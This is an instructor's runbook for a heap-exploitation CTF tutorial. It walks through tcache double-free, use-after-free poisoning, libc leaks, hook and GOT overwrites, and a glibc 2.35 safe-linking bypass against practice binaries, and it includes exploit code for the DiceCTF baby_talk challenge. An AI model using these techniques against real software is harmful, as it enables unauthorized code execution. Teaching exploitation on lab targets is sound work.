# Heap Pwn Tutorial — Full Rehearsal Runbook

~3h05. Instructor-facing: every segment, what to show, what to say, the exact
demo commands, expected pwndbg output, and the transition line into the next
segment. Drill this before the live session.

## How to use

- Two kinds of live time:
  - **pwndbg-only** (Part I): `gdb ./heapnote`, drive `heap` / `vis_heap_chunks`
    / `tcache` / `bins` by hand to show the concepts.
  - **`--demo` exploits** (C1–C4, baby_talk): live-code the exploit into the
    handout's `skeleton.py` (`handouts/challenges/`), then `python3 cX/skeleton.py --demo`
    inside tmux. pwndbg attaches right pane with `break menu` (or `break print_menu`
    for baby_talk) + `continue` → proc stops after **every** command.
    (`exp.py`/`solve.py` = instructor answer keys, source repo — not in the handout.)
- **Demo gdb rhythm (memorize):** at each `DEMO | run: <cmd> | <what>` hint,
  run `<cmd>` in the gdb pane, narrate, then `continue` in gdb to advance.
  `continue` is the pacesetter — the exp blocks at the next menu until you
  `continue`. Non-hint stops = quick `continue` (or `disable 1` through a
  prime loop, `enable 1` before the next hint).
- Pre-flight (do once before the session, not live):
  `make setup && make all` in `challenges/`; verify each
  `python3 cX_*/exp.py` pops a shell and `cat flag.txt` works. Then
  `bash pack_handout.sh --zip` builds `handouts/challenges/` + `handouts/handout.zip`
  (the live-demo dir + the student artifact).

## Time table

| Time | Segment | Kind |
|---|---|---|
| 0:00–0:10 | 00 Overview & agenda | talk |
| 0:10–0:30 | 01 Heap layout & chunks | pwndbg live |
| 0:30–0:45 | 02 tcache | pwndbg live |
| 0:45–1:30 | 03 Environment setup | talk (no live demo) |
| 1:30–1:45 | C1 double-free → GOT | `--demo` |
| 1:45–2:00 | C2 unsorted leak → `__free_hook` | `--demo` |
| 2:00–2:15 | C3 UAF-Edit → `__free_hook` | `--demo` |
| 2:15–2:30 | C4 safe-linking (stretch) | `--demo` |
| 2:30–3:00 | baby_talk capstone | `--demo` |
| 3:00–3:05 | 09 Agentic pwn intro | talk |

---

# Part I — Concepts (0:00–1:30)

## 00 Overview & agenda (0:00–0:10) — talk

**Narrate:**
- Heap pwn = abusing `malloc`/`free` to turn memory-safety bugs into arb
  read / arb write / code exec. Unlike stack pwn (return address), we corrupt
  the allocator's own bookkeeping.
- Why glibc 2.27: no tcache key, no safe-linking, hooks present — the cleanest
  teaching target. 2.35 is the realistic modern target (C4 stretch).
- Show the **map** (slide "How C1–C4 fit together"): two axes you stack, not a
  ladder. C1→C2 adds a leak; C2→C3 swaps the write vector; C3→C4 switches to
  2.35 and recombines C1+C2+C3. "Three flat steps on 2.27, then the 2.35
  stretch."
- The shared `heapnote` binary: Add/Delete/Edit/Show. **One bug**:
  `delete()` never sets `notes[i]=NULL`. That one line gives both double-free
  and UAF — exploited four ways.

**Transition:** "Before the bugs, the plumbing. What does a chunk look like?"

## 01 Heap layout & chunks (0:10–0:30) — pwndbg live

```
gdb ./heapnote
pwndbg> break main
pwndbg> run
pwndbg> heap
pwndbg> vis_heap_chunks
```

**Show & narrate:**
- `heap`: the contiguous region, chunks carved left→right, top chunk at the
  end, grown via `brk` (or `mmap` for big allocs).
- `vis_heap_chunks`: the ascii map. Point at one in-use chunk:
  `prev_size | size | user data`. `malloc` returns `chunk+0x10`. Flags in
  the size low 3 bits: P (prev in use), M (mmap), A (non-main arena).
- **The key idea to land:** when a chunk is freed, the user-data area is
  **reused as the allocator's linked-list pointers** (`fd`/`bk`). "Read/write
  a freed chunk's data = read/write the allocator's list pointers. Every
  exploit in this course is corrupting these pointers."
- Min chunk 0x20: must hold `prev_size+size+fd+bk`. Alignment 0x10.

**Transition:** "Freed chunks live in bins. The one that matters for
beginners is tcache."

## 02 tcache (0:30–0:45) — pwndbg live

Same `gdb ./heapnote` session (or restart). Alloc + free a couple of notes
by hand to populate tcache, then:

```
pwndbg> tcache
pwndbg> tcachebins
pwndbg> bins
```

**Show & narrate:**
- tcache = thread-local cache, glibc 2.26+. 64 bins, bin `i` = size
  `0x20 + i*0x10`, max 0x410. Bigger skips tcache → unsorted bin (this is C2's
  leak lever).
- Per freed chunk in tcache: `prev_size | size | fd(next)` — `fd` sits in the
  user-data area. LIFO stack. `counts[idx]++` on free, `--` on malloc.
- **Why 2.27 is easy mode (land this, C1–C3 depend on it):** no tcache key
  (2.29) → double-free = self-loop, no check; no safe-linking (2.32) → `fd`
  is the raw pointer; `tcache_get` does **not** check chunk size → poisoned
  `fd` can point anywhere (GOT/libc) and malloc returns it verbatim.
- The two bugs from the one missing NULL: double-free (`del;del`) and
  UAF (`del;edit` writes fd; `del;show` reads fd).

**Transition:** "Now the toolchain so you can reproduce all of this on your
laptop."

## 03 Environment setup (0:45–1:30) — talk, no live demo

**Narrate (no live run — `make setup && make all` was done pre-flight):**
- Toolchain table: pwntools, pwndbg, one_gadget, patchelf, etc. All local,
  no Docker.
- **The two pinned libcs and why exactly these builds** (slide table):
  - C1–C3: `2.27-3ubuntu1` (18.04 **GA**) — no tcache key → double-free
    works. ⚠ Ubuntu backported the tcache double-free check into
    `2.27-3ubuntu1.2+` (e.g. `1.6`) → those abort. We pin GA on purpose.
  - C4: `2.35-0ubuntu3.14` — safe-linking stretch; hooks removed in 2.34.
- patchelf vs re-link (the trap): patchelf only touches runtime binding; a
  2.34+-host `crt1.o` bakes a `GLIBC_2.34` requirement patchelf can't remove
  → binary dies under 2.27. That's why `heapnote` is linked against a 2.27
  sysroot (needs only `GLIBC_2.2.5`), then patchelf pins the
  interpreter+rpath. **Gotcha:** rpath dir needs a `libc.so.6` symlink → the
  real `libc-X.so`, or the loader silently falls back to the host libc.
- pwndbg commands to memorize: `heap`, `vis_heap_chunks`, `bins`, `tcache`,
  `tcachebins`.
- how2heap = the canonical PoC library, one file per technique per glibc
  version. Every `exp.py`/`solve.py` here (instructor answer keys, source repo)
  is a hand-stripped how2heap technique; students get a `skeleton.py` (utils +
  `TODO`) per challenge in the handout.

**Transition (into Part II):** "One bug, four escalations. C1 is the core
mechanic — everything else adds or swaps one thing on top."

---

# Part II — The Challenges (1:30–3:00)

**`exp:` lines below are shorthand, not paste-ready:** `del` = the `delete()`
helper; `p64(free@GOT)` / `win` / `__free_hook` / `system` mean the real vars
(`p64(free_got)` / `p64(win_addr)` / `p64(free_hook)` / `p64(libc.sym["system"])`).
Type the real calls into the skeleton's `TODO` blocks, then run
`python3 cX/skeleton.py --demo` from `handouts/challenges/`.

## C1 — tcache double-free → GOT overwrite (1:30–1:45) — `--demo`

**Goal (one line):** no leak, no libc; the heap bug + `-no-pie`. Overwrite
`free@GOT` with `&win`, call `free` → shell.

```
cd handouts/challenges
python3 c1_double_free/skeleton.py --demo
```
pwndbg right pane, `break menu` + `continue` → first menu stop.

**Demo flow (4 hint stops):**

1. **exp:** `add(0,0x28,"AAAA"); del(0); del(0)` — double-free.
   **hint:** `run: tcache | 0x30 bin A->A self-loop, counts=2`
   **gdb:** `tcache` → 0x30 bin, `counts=2`, head→A, A->fd=A.
   **Narrate:** 2.27 has no tcache key, so freeing A twice makes A point at
   itself. No check fires. This is a corrupted linked list we control.

2. **exp:** `add(1,0x28, p64(free@GOT))` — malloc #1 returns A, write
   `&free@GOT` into A's data = A's `fd`.
   **hint:** `run: tcache | A->fd now &free@GOT`
   **gdb:** `tcache` → A->fd = `free@GOT`.
   **Narrate:** `tcache_get` doesn't check chunk size → a poisoned fd can
   point anywhere. We point it at the GOT.

3. **exp:** `add(2,0x28,"DUMMY")` (malloc #2, drains self-loop) →
   `add(3,0x28, p64(win))` (malloc #3 returns `free@GOT`, write `&win`).
   **hint:** `run: got | free -> win`
   **gdb:** `got` → `free` now points at `win`.
   **Narrate (the 3-malloc rule):** #1 returns A and we poison its fd; #2
   returns A again (drains the self-loop), head advances to `free@GOT`; #3
   returns `free@GOT` itself — we write `&win` there. Note why data size is
   0x28 (0x30 chunk), not 0x18: so the data bin differs from the `note_t`
   struct bin (0x20), else the struct malloc eats our poisoned chunk.

4. **exp:** `del(0)` — trigger.
   **hint:** `continue in gdb to trigger: next free() -> win() -> shell`
   **Narrate:** `notes[0]->data` still points at A (del never NULLs it), so
   `del(0)` frees A through the hijacked `free@GOT` → `win()` →
   `system("/bin/sh")`. `continue` → shell. `cat flag.txt`.

**Transition → C2:** "C1 needed no leak because `-no-pie` gives static
GOT/win. Add ASLR (PIE) and we need a libc leak. Same double-free write,
new target: `__free_hook`."

## C2 — unsorted-bin libc leak → `__free_hook` → system (1:45–2:00) — `--demo`

**Goal:** defeat ASLR: leak libc base, overwrite `__free_hook` with `system`,
`free("/bin/sh")`.

```
python3 c2_unsorted_leak/skeleton.py --demo
```

**Demo flow (3 hint stops):**

1. **exp:** `add(0,0x418,...)` (0x420 chunk, bigger than tcache max 0x410) →
   `add(1,0x18,"GUARD")` → `del(0)` → unsorted bin.
   **hint:** `run: bins | 0x420 chunk in the unsorted bin`
   **gdb:** `bins` → 0x420 chunk in unsorted.
   **Narrate:** tcache only holds 0x20–0x410. 0x418 request → 0x420 chunk →
   tcache won't take it → on free it lands in the unsorted bin. The guard
   stops it merging into top.

2. **exp:** `show(0)` (UAF-read the freed chunk's data = its `fd`) → compute
   `libc.address = leak - (__malloc_hook+0x10) - 96`. Then the double-free +
   3-malloc (byte-for-byte C1's, target now `__free_hook`):
   `add(2,0x68); del(2); del(2)` → `add(3,0x68,p64(__free_hook))` →
   `add(4,0x68,"DUMMY")` → `add(5,0x68,p64(system))`.
   **hint (after the double-free):** `run: tcache | 0x70 bin A->A, counts=2`
   (then continue to the poison+finish)
   **hint (after add(5)):** `run: p &__free_hook | value == system`
   **gdb:** `p &__free_hook` / `x/gx &__free_hook` → value = `system`.
   **Narrate:** unsorted fd = `main_arena+96`; `main_arena = __malloc_hook+0x10`
   → libc base. All offsets read from the shipped libc at runtime → robust to
   sub-version drift. The write is C1's double-free unchanged; only the
   target moved (`free@GOT` → `__free_hook`). After malloc #3 pops
   `__free_hook`, the 0x70 bin is left empty (`*(__free_hook)=0`), so the
   `/bin/sh` malloc comes fresh from top — no poisoned-bin crash.

3. **exp:** `add(6,0x68,"/bin/sh")` → `del(6)` → shell.
   **Narrate:** `free(ptr)` → `__free_hook(ptr)` → `system("/bin/sh")`.
   `__libc_free` calls `hook(ptr, caller)` (2 args); `system` reads only
   `rdi` → extra `rsi` harmless. `continue` → shell. `cat flag.txt`.

**Takeaways to land:** size > tcache max → unsorted → libc leak;
`main_arena+96` is the canonical 2.27 leak target; `__free_hook` is the
cleanest 2.27 hijack (gone in 2.34).

**Transition → C3:** "C1/C2 both use the double-free. 2.29 added a tcache
key that detects double-frees. C3 swaps the write vector to UAF-Edit — same
leak, same target, but survives the key."

## C3 — UAF-Edit poisoning → `__free_hook` (+ one_gadget) (2:00–2:15) — `--demo`

**Goal:** same shell as C2, but the poisoning vector is a **single**
use-after-free + Edit — no double-free at all.

```
python3 c3_uaf_poison/skeleton.py --demo
```

**Demo flow (3 hint stops):**

1. **exp:** stage-1 leak (identical to C2: `add(0,0x418); add(1,0x18); del(0);
   show(0)` → libc base). Then prime the 0x70 bin with **two distinct**
   chunks: `add(2,0x68); add(3,0x68); del(3); del(2)` → head=2→3, counts=2.
   **hint:** `run: tcache | 0x70 bin 2->3, counts=2 (NO self-loop -- contrast C1)`
   **gdb:** `tcache` → 0x70 bin 2→3, counts=2, no self-loop.
   **Narrate (the count rule):** `tcache_get` needs `counts>0`; to pop
   victim-then-target we need `counts>=2`. Free **two distinct** chunks (not
   the same one twice) → counts=2 with no self-loop and no double-free
   signature. This is the C3 subtlety.

2. **exp:** `edit(2, 8, p64(__free_hook))` — UAF: edit the dangling head's
   data = its `fd` → `__free_hook`. Then `add(4,0x68,"PAD")` (malloc #1 =
   chunk-2) → `add(5,0x68,p64(system))` (malloc #2 = `__free_hook`).
   **hint (after edit):** `run: tcache | head's fd -> __free_hook`
   **hint (after add(5)):** `run: p &__free_hook | value == system`
   **gdb:** `tcache` → head's fd = `__free_hook`; then `p &__free_hook` =
   `system`.
   **Narrate:** UAF-Edit subsumes double-free for poisoning with fewer
   detection risks — frees once, then edits the dangling pointer; no
   double-free signature at all. Generalizes to 2.29+ (and, with
   safe-linking handling, to 2.32+ — see C4).

3. **exp:** `add(6,0x68,"/bin/sh")` → `del(6)` → shell.
   **Narrate:** same trigger as C2. `continue` → shell. `cat flag.txt`.

**one_gadget aside (mention, don't demo unless asked):** instead of
`system`+`/bin/sh`, write a single `execve("/bin/sh")` gadget into
`__free_hook`/`__malloc_hook`. `one_gadget glibc-2.27/libc-2.27.so` lists
gadgets + stack constraints. Pro: no `/bin/sh` placement. Con:
constraint-dependent — pre-test in-context. `system`+`/bin/sh` is the
reliable default; run `python3 c3_uaf_poison/exp.py --one-gadget` (answer key,
source repo — not in the handout) for the fancy alt.

**Transition → C4:** "C1–C3 all on 2.27. C4 switches to 2.35. Two new walls:
encrypted fd (safe-linking) and no `__free_hook`. We reuse C3's UAF + C2's
leak, add a heap-page leak, and fall back to C1's GOT overwrite."

## C4 — safe-linking bypass on glibc 2.35 (2:15–2:30) — `--demo` (stretch)

**Goal:** defeat safe-linking (PROTECT_PTR) to do tcache poisoning on 2.35,
then GOT overwrite (hooks are gone on 2.34).

```
python3 c4_safe_linking/skeleton.py --demo
```

**Demo flow (4 hint stops):**

1. **exp:** stage-1 libc leak (same 0x420 unsorted mechanic as C2, but the
   offset is the unsorted-head offset directly — `__malloc_hook` is a compat
   no-op on 2.34+, so the C2/C3 `main_arena=__malloc_hook+0x10` trick is
   gone; use `UNSORTED_HEAD_OFF=0x21ace0`).
   **hint:** `run: bins | 0x420 chunk in the unsorted bin`
   **gdb:** `bins` → 0x420 unsorted chunk.
   **Narrate:** same leak idea as C2, different offset (no `__malloc_hook` on
   2.35; use the fixed unsorted-head offset; recompute if you pin a
   different 2.35 sub-version).

2. **exp:** `add(2,0x68,"H"); del(2)` (only entry in its bin) →
   `prot_fd = u64(show(2)[:8])` → `heap_page = prot_fd` (because real next =
   NULL → `stored_fd = &fd>>12 XOR 0 = &fd>>12`).
   **hint:** `run: vis_heap_chunks | freed note-2 stored fd == heap_page (printed above) -- the >>12 key`
   **gdb:** `vis_heap_chunks` → freed note-2 stored fd = the printed heap_page.
   **Narrate (the easy part of C4):** if a chunk is the **only** entry in a
   tcache bin, its real next is NULL, so the protected fd *is* `&fd>>12` —
   exactly the value we need to forge pointers. A UAF-read leaks it. PROTECT_PTR
   only uses `&fd>>12` (the page), and all our small chunks share a page.

3. **exp:** prime two more 0x68 chunks (`add(3); add(4); del(4); del(3)` →
   head=3→4→note2, counts=3). Forge the protected pointer:
   `forged = protect_ptr(heap_page<<12, puts@GOT)` → `edit(3,8,p64(forged))`.
   **hint:** `run: tcache | protected fd (PROTECT_PTR'd)`
   **gdb:** `tcache` → the protected (XOR'd) fd.
   **Narrate:** to poison fd at target T, write `(&fd>>12) XOR T`. We forge
   `PROTECT_PTR(&fd, puts@GOT)`. The next malloc returns `puts@GOT`.

4. **exp:** `add(5,0x68,"PADDING")` (malloc #1 = chunk-3; head → puts@GOT) →
   `add(6,0x68,p64(win))` (malloc #2 = puts@GOT; write `&win`).
   **hint:** `run: got | puts -> win`
   **gdb:** `got` → `puts` = `win`.
   **Narrate:** after add(6) returns, the menu loop calls `menu()` →
   `puts("=== heapnote ===")` → `win()` → `system("/bin/sh")`. **The 2.34+
   subtlety to name:** `tcache_get()` zeroes `returned_ptr+8` (`e->key=0`), so
   target `puts@GOT` (its +8 neighbour `write@GOT` is never called in the
   menu path), NOT `free@GOT` (whose +8 is `puts@GOT`, which `menu()` would
   call and crash). `win()` uses `system@GOT` (untouched) so it still fires.
   `continue` → shell. `cat flag.txt`.

**Honest framing to land:** this is a shell because heapnote hands us a
writable GOT. A real 2.35 target (full RELRO, no `win()`) needs structural
finishers — FSOP / House of Apple (fake `_IO_FILE` + vtable in the validated
range), `exit_funcs`/TLS `dtor_list` (gated by PTR_MANGLE → also leak the
pointer guard), `__printf_function_table` (House of Husk). That's "what's
next."

**Transition → baby_talk:** "C1–C4 were all the same `heapnote` binary with
one contrived bug. baby_talk is a real DiceCTF 2024 challenge — different
binary, different bug, but the same leak-poison-hook skeleton. That's the
transfer test."

## baby_talk — DiceCTF 2024 capstone (2:30–3:00) — `--demo`

**Segment plan:** 0–10 min students read `binary` cold (map `str`/`tok`/`del`,
find the bug themselves — transfer test, no hand-holding). 10–30 min
walkthrough + live PoC.

```
cd handouts/challenges
python3 baby_talk/skeleton.py --demo   # break print_menu (this binary's per-iteration fn)
```

**The bug (correct it live — common misread):** it is **`str`, not `del`**.
`del` nulls the pointer (`movq $0x0`) — **no UAF, no double-free**. The bug:
`str` does `read(0,p,size)` with **no null terminator**; `tok` = `strtok`
scans to `\0` with no length bound → escapes the chunk into the next chunk's
header; `strtok` writes `\0` over each delimiter byte in place. Aim the
delimiter at a byte inside the neighbour's size field → targeted null-byte
corruption of chunk metadata. **No buffer overflow; the destructive parser
is the write primitive.** Three facts that make it work: (1) `read` appends
no `\0` → no string boundary inside the chunk; (2) `strtok` is a C-string
function that stops on `\0` and does not know the chunk size; (3) the chunk
has no `\0` → strtok escapes into the next chunk's header and writes `\0`
over the delimiter byte (the neighbour's size low byte).

**Demo flow (6 hint stops):**

### 0. Setup

pwndbg pops right, `break print_menu` + `continue` → stops at first menu
(state = initial empty heap).
**Narrate:** DiceCTF 2024 baby_talk, glibc 2.27, Full RELRO + PIE + canary +
NX. Menu: `str`/`tok`/`del`. Same skeleton as C1–C3 — leak + poison tcache +
`__free_hook` — but the fd-corruption vector is a new trick; that is the
point of this slot.
**gdb:** `heap` → empty, only top chunk. `continue`.

### 1. Leak — residual fd (NOT a UAF)

**exp (auto, ~27 commands; each menu stops — `disable 1` through the prime
loops, `enable 1` before the hint, or rapid `continue`):**
```python
for _ in range(9): do_str(io, 0xF8, b"A")   # alloc 9
for i in range(9):  do_del(io, 8-i)          # free 9 (7 tcache + 2 -> unsorted, merge)
for _ in range(9): do_str(io, 0xF8, b"A")    # re-alloc 9, 1-byte "A" each
do_tok(io, 0, b".")   # heap leak (slot 0, tcache fd)
do_tok(io, 7, b".")   # libc leak (slot 7, unsorted fd)
```
**hint:** `run: vis_heap_chunks | slot 0 + slot 7 residual fd`
**gdb:** `vis_heap_chunks`
**see:** slot 0 data = `41` + heap-pointer bytes (residual tcache fd);
slot 7 data = `41` + libc-area pointer (residual unsorted fd).
**Narrate:** `del` nulls the pointer → **not a UAF**. Leak works because
`malloc` does not zero reused memory: after free the fd sits in the data
area; re-alloc writes only 1 byte `"A"`, leaving 7 bytes of the old fd.
`tok`+`puts` prints them. slot 0 → tcache residual (heap) → page-align →
`heap_base`. slot 7 → unsorted residual (`main_arena` area) →
`libc.address = leak - 0x3EBE41`. This is the C2 leak trick, nothing new.
`continue`.

### 2. Overlap — the strtok null-byte trick (the core)

**exp:**
```python
do_str(io, 0xF8, b"a"*0xF8)   # slot 9: 0xF8 'a', NO \0
do_str(io, 0xF8, b"b")        # slot 10
do_str(io, 0xF8, b"x")        # slot 11
for i in range(6): do_del(io, 5-i)   # free slots 5..0, fill 0x100 tcache
do_tok(io, 9, b"\x01")       # <- THE BUG
```
**hint:** `run: vis_heap_chunks | slot 10 size 0x101 -> 0x100`
**gdb:** `vis_heap_chunks`
**see:** slot 10 size field is `0x100`, not `0x101`. PREV_INUSE (bit 0)
cleared.
**Narrate:** slot 10 size = `0x101`, low byte = `0x01` == delimiter. strtok
finds it → writes `\0` in place: `0x101 -> 0x100`, PREV_INUSE cleared. slot
10 now believes "the previous chunk is free." `read` fills by length,
`strtok` stops by `\0` — boundary models disagree, chunk has no `\0` →
strtok escapes and writes `\0` into the next chunk's size. **No buffer
overflow; the destructive parser *is* the write primitive.** `continue`.

**exp — sculpt fake prev chunk + trigger consolidation:**
```python
do_del(io, 9)                 # reclaim slot 9
victim = do_str(io, 0xF8,     # sculpt a fake FREE 0xE0 chunk inside slot 9
    p64(0)*2 + p64(0) + p64(0xE0)
    + p64(heap+0xB80)*2 + p64(heap+0xB70)*2   # fake fd/bk/nextsize -> in-heap, pass unsorted check
    + b"c"*0xB0 + p64(0xE0))  # trailing prev_size = 0xE0
do_del(io, victim)            # fake chunk enters unsorted bin
do_del(io, 10)                # P=0 -> backward consolidation -> big chunk over slot 11
```
**hint:** `run: bins | backward-consolidated unsorted chunk OVERLAPS slot 11`
**gdb:** `bins`
**see:** unsorted bin holds a big chunk whose range covers the still-live
slot 11.
**Narrate:** On `del(10)` malloc sees PREV_INUSE=0 → reads prev_size (0xE0,
our sculpture) → steps back 0xE0 to the fake chunk → consolidates. Fake
fd/bk point at heap addresses we pre-placed, passing the unsorted-bin list
checks. The merge produces one big chunk that **physically overlaps slot
11**. slot 11 is still live in the table — a later alloc from the big chunk
writes straight over slot 11's tcache fd. That is the "overlap." `continue`.

### 3. Poison — 0x20 tcache fd -> `__free_hook`

**exp:**
```python
q = do_str(io, 0x18, b"Q")
do_del(io, do_str(io, 0x18, b"x"))   # two frees of DIFFERENT chunks
do_del(io, q)                         # 0x20 tcache counts=2 (C3 count rule, NOT double-free)
do_str(io, 0xF8, b"X"*0x18 + p64(0x21) + p64(__free_hook))  # overlap writes fake 0x21, fd->__free_hook
```
**hint:** `run: tcache | 0x20 bin fd -> __free_hook`
**gdb:** `tcache`
**see:** the 0x20 tcache bin lists `__free_hook`.
**Narrate:** This is C3's pattern, **not C1's double-free**. The two freed
0x18 chunks are **distinct** (`"x"` and `q`), so tcache counts=2 with no
self-loop and no double-free signature — 2.27-1.6 has the tcache key, so a
real double-free would be caught; this sidesteps it. The overlap lets us
write a fake `0x21` chunk inside the big chunk whose fd overlaps the live
0x20 tcache head. fd = `__free_hook`. Full RELRO → no GOT write → the libc
hook is the target. `continue`.

**exp:**
```python
binsh_idx = do_str(io, 0x18, b"/bin/sh")   # malloc #1: pop legit head, head = __free_hook
do_str(io, 0x18, p64(system))              # malloc #2: pop __free_hook, write system
```
**hint:** `run: p &__free_hook | value == system`
**gdb:** `p &__free_hook` then `x/gx &__free_hook`
**see:** `__free_hook` value = `system` address.
**Narrate:** Two mallocs drain the list: #1 pops the legit chunk (head
advances to `__free_hook`); #2 pops `__free_hook` itself — malloc returns
the `__free_hook` address, we write `system` there. Now `__free_hook =
system`. Any `free(ptr)` becomes `system(ptr)`. `continue`.

### 4. Trigger — `free("/bin/sh")` -> `system("/bin/sh")`

**exp:**
```python
# hint: next free() -> system('/bin/sh'); continue to trigger
do_del(io, binsh_idx)   # free("/bin/sh") -> system("/bin/sh")
io.interactive()
```
**hint:** `continue in gdb to trigger: next free() -> system('/bin/sh')`
**Narrate:** The `binsh_idx` chunk holds `"/bin/sh"`. `free(ptr)` ->
`__free_hook(ptr)` -> `system("/bin/sh")`. `continue` in gdb to fire it.
**gdb:** `continue` → shell.
```
cat flag.txt
# dice{tkjctf_lmeow_fee9c2ee3952d7b9479306ddd8e477ca}
```

### Wrap the capstone (land these)

- baby_talk = **C2 (leak) + C3 (`__free_hook`) + a new fd-corruption vector**
  (the strtok null-byte overlap) **replacing** C1's double-free — not
  "C1+C2+C3 plus a trick." Full RELRO → hook (not GOT) is the target.
- `del` nulled the pointer; the leak reads residual fd in re-allocated
  chunks, not a UAF. "Malloc never clears reused memory."
- Same leak-poison-hook template; different write vector. That's the whole
  skill: recognize the template, swap the vector.

---

# Part III — Agentic Pwn (3:00–3:05) — talk

5-minute teaser, not a lecture. Cover *The pitch* + *The loop that works*;
the rest is a "where to go next" pointer.

**Narrate:**
- **Pitch:** can an LLM agent *solve* a heap pwn challenge? 2024–2026 moved
  from "no" to "sometimes, with the right loop."
- **The loop that works** (the diagram): agent (Claude) reads decompiled code
  via a binary-analysis MCP + gdb/pwntools; never "sees" memory directly —
  reasons from decompiled code + pwndbg output fed back as context, emits
  the next pwntools action. Heap pwn is hard for agents because the state is
  large and invisible without the right `pwndbg` dumps at each step.
- **Where to go next:** pre-LLM AEG lineage (AEG NDSS'11, Mayhem/DARPA CGC,
  HeapHopper, MAZE/SCATTER/BAGUA); agentic frontier (ExploitGym breadth,
  ExploitBench depth/V8, DARPA AIxCC); for beginners use the agentic loop as
  a **tutor** (explain my exploit, suggest next steps) before an autonomous
  solver.
- pwn.college + how2heap for self-study.

**Close:** "Slides + challenges + answer keys (`exp.py`/`solve.py`) in the repo;
students get `handout.zip` (binaries + `skeleton.py` per challenge). Reference: pwn.college
· how2heap."

---

## Rehearsal checklist

- [ ] `make setup && make all` pre-flight; each `python3 cX_*/exp.py` pops a
      shell + reads `flag.txt` (`flag{h34p_pwn_tutr0ial_d3mo_fl4g}`).
- [ ] `bash pack_handout.sh --zip` builds `handouts/challenges/` +
      `handouts/handout.zip` (live-demo dir + student artifact).
- [ ] `baby_talk`: `python3 solve.py` reads the dice flag.
- [ ] Inside tmux, smoke one `--demo` (e.g. C1): confirm pwndbg attaches,
      `break menu` stops after each command with a clean prompt, `tcache`
      works at the stop.
- [ ] Know the gdb rhythm: hint → run cmd → narrate → `continue`.
- [ ] Prime loops boring? `disable 1` ... `enable 1` around them.
- [ ] Land the three transition lines (C1→C2 add leak; C2→C3 swap vector;
      C3→C4 switch to 2.35) and the capstone wrap.
- [ ] No Chinese on slides/README/REHEARSAL materials (this file is English).